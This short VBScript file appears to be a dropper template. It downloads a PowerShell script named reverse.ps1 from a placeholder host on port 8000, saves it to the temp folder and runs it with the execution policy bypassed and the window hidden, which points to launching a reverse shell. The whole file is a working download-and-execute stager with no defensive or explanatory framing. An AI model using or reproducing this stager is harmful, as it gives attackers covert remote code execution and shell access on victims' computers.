Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://__HOST__:8000/reverse.ps1", False
xHttp.Send
bStrm.Type = 1
bStrm.Open
bStrm.Write xHttp.ResponseBody
bStrm.SaveToFile "%TEMP%\\rev.ps1", 2
CreateObject("WScript.Shell").Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File %TEMP%\\rev.ps1", 0
